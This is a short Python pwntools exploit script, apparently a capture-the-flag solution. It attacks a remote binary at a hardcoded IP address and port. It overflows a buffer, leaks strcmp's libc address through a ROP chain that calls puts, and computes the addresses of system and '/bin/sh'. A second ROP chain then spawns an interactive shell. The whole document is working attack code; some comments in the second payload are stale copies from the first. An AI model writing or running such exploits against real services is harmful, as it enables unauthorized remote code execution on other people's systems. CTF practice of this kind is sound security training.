from pwn import *

bug = 0x7F1126
poprdi = 0xEAEE63

r = remote('125.235.240.168', 27016)
#r = process('./explorer')
raw_input('?')

r.recvuntil('Castle number: ')
r.send('42590\x00\x00\x00')
r.send("nSGDGJV\x00")

payload = "a"*0x18
payload += p64(poprdi)
payload += p64(0x161F048) #strcmp GOT
payload += p64(0x400640) #puts
payload += p64(bug)
#payload += "\x00"*(0x10A3-len(payload))
r.send(payload)

r.recvuntil('GET IT?\n')
strcmp = u64(r.recv(6)+"\x00"*2)
log.info("strcmp: %#x" %strcmp)
base = strcmp - 0x9f570
system = base + 0x45390
sh = base + 0x18cd57
log.info("base: %#x" %base)
log.info("system: %#x" %system)
log.info("sh: %#x" %sh)

sleep(1)

r.send("nSGDGJV\x00")
payload = "a"*0x18
payload += p64(poprdi)
payload += p64(sh) #strcmp GOT
payload += p64(system) #puts
payload += "\x00"*(0x10A3-len(payload))
log.info(len(payload))
r.send(payload)
r.interactive()